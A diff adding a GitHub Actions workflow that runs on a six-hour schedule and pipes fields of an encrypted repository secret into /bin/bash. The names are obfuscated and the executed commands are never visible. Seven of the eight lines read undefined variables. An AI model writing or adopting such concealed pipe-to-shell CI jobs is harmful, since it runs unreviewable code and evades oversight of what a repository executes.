@@ -1,0 +1,25 @@
+name: tangjiusha
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '36 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: tangjiusha
+        env:
+          hqg46786: ${{ secrets.hqg46786 }}
+        run: |
+          echo $hqg46786 | jq -r .g90 | /bin/bash
+          echo $lg93 | jq -r .dkd14 | /bin/bash
+          echo $qp64405 | jq -r .aoosz6 | /bin/bash
+          echo $q85 | jq -r .dkf2053 | /bin/bash
+          echo $bb3929 | jq -r .dtrgy1930 | /bin/bash
+          echo $vpjfw40782 | jq -r .qldff558 | /bin/bash
+          echo $sop672 | jq -r .oogll720 | /bin/bash
+          echo $mafo4709 | jq -r .kr6551 | /bin/bash
+
